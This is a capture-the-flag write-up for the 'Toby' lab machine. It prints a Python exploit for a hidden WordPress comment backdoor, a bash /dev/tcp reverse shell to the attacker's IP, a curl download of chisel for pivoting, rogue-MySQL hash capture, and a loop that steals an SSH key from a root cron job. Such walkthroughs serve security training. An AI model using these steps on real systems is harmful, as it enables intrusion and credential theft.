## Overview

Toby is an Insane-difficulty Linux machine. Only SSH and nginx are exposed; nginx fronts a WordPress blog whose story is that it was "hacked and cleaned." The cleanup missed a backdoor. The path to `user.txt` runs through an unlisted Gogs repository, a leftover PHP comment backdoor that speaks a custom XOR protocol, a chisel pivot into an internal Docker network, a cracked WordPress hash, and a race on a temporary file a root cron job briefly creates. Privilege escalation is out of scope for this post.

## Recon

| Port | Service | Notes |
|------|---------|-------|
| 22   | OpenSSH | no creds yet |
| 80   | nginx 1.18.0 | WordPress, asset links point at `wordpress.toby.htb` |

```bash
nmap -p- --min-rate=1000 -T4 10.129.8.43
nmap -p22,80 -sC -sV 10.129.8.43
```

The homepage looks broken until you notice it loads assets from the `wordpress.toby.htb` virtual host. Add the vhosts to `/etc/hosts`:

```bash
echo "10.129.8.43 toby.htb wordpress.toby.htb backup.toby.htb" | sudo tee -a /etc/hosts
```

## Enumeration

A vhost brute-force surfaces a second name, `backup.toby.htb`, running Gogs (a self-hosted Git server):

```bash
gobuster vhost -u http://toby.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain
```

Gogs lists a user `toby-admin` with no public repos. Repos can be "unlisted" — public but not shown on the profile — and are reachable if you know the name. Brute-force repo names under that user:

```bash
wfuzz -u "http://backup.toby.htb/toby-admin/FUZZ" --hl 210 -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
```

This reveals a `backup` repo: a full WordPress site backup, with a note claiming all backdoors were removed. Download and scan it. `wp-config.php` leaks MySQL creds, and a PHP malware scan flags `wp-includes/comment.php` — an obfuscated backdoor that base64-decodes, ROT13s, and `gzuncompress`es a payload into `eval()`.

## Foothold

Decoded, the backdoor only triggers on a comment with a specific signature: author email `help@toby.htb`, URL `http://test.toby.htb/`, and a body beginning with the hex `746f6279` ("toby") followed by an IP and a secret. When triggered, the server connects back to that IP on port **20053** and opens an XOR-encrypted command channel — the one-byte key is derived by XOR-ing the blob the server returns with the secret we submitted (it decodes to `KEY_PREFIX_<k>_KEY_SUFFIX`).

The exploit posts the comment, listens on 20053, derives the key, and sends XOR-encoded commands:

```bash
# post the magic comment + handle the connectback (full script below)
python3 backdoor.py "id; hostname"
# -> uid=33(www-data)  hostname: wordpress  (/.dockerenv present)
```

```python
# backdoor.py (core)
import socket, requests, threading, time
from binascii import unhexlify
LHOST, RHOST, SEC = "10.10.16.13", "10.129.8.43", "ba4fb13188ee48077524f9ac23c230250c5661aec9776389e8befbce277c72de"
def post():
    time.sleep(1.5)
    requests.post(f"http://{RHOST}/wp-comments-post.php", headers={"Host":"wordpress.toby.htb"},
        data={"comment":f"746f6279{LHOST}:{SEC}","author":"x","email":"help@toby.htb",
              "url":"http://test.toby.htb/","submit":"Post Comment","comment_post_ID":"5","comment_parent":"0"}, timeout=3)
s=socket.socket(); s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1); s.bind(("0.0.0.0",20053)); s.listen(1)
threading.Thread(target=post,daemon=True).start()
c,_=s.accept(); guid,h=c.recv(4096).split(b"|")
blob=unhexlify(unhexlify(h.strip()).split(b":")[-1]); sec=unhexlify(SEC)
xor=bytes(blob[i]^sec[i] for i in range(len(blob))).split(b"_")[2][0]
c.send(bytes(x^xor for x in b"id"))
```

With code execution confirmed, fire a reverse shell through the same channel:

```bash
python3 backdoor.py "bash -c 'bash -i >& /dev/tcp/10.10.16.13/9001 0>&1'"
# nc -lvnp 9001  -> www-data@wordpress
```

We're `www-data` inside a Docker container. The host is on an internal network; pivot in with chisel:

```bash
./chisel server -p 8001 --reverse                       # attacker
curl -s http://10.10.16.13:8080/chisel -o /tmp/.c && chmod +x /tmp/.c
/tmp/.c client 10.10.16.13:8001 R:1080:socks            # on the container
```

Through the SOCKS proxy, the WordPress DB creds dump and crack the `toby-admin` hash (`<redacted>`), which logs into Gogs and exposes a Flask app. The app was created with an empty `static_folder`, so it serves its own source:

```bash
proxychains4 curl http://172.69.0.104/static/app.py
```

The source reveals a `/api/dbtest` endpoint that makes the server's MySQL client connect to any host you supply. Pointing it at a rogue MySQL server captures `jack`'s `mysql_native_password` net-auth hash; it isn't in rockyou, but the app's password generator seeds its RNG on a known date, so a generated wordlist cracks it. That password SSHes onto the internal MySQL container as `jack`:

```bash
proxychains4 sshpass -p '<redacted>' ssh jack@172.69.0.102
```

On that container a root cron job runs `mysqldump` and `scp`s the backup to the host using a private key it writes briefly to `/tmp/tmp.XXXX/key`. Race that file to steal `jack`'s **host** SSH key:

```bash
while true; do k=$(cat /tmp/*/key 2>/dev/null); [ -n "$k" ] && { echo "$k"; break; }; done
```

Use the stolen key to SSH to the real host as `jack`:

```bash
chmod 600 jack_key
ssh -i jack_key jack@10.129.8.43
```
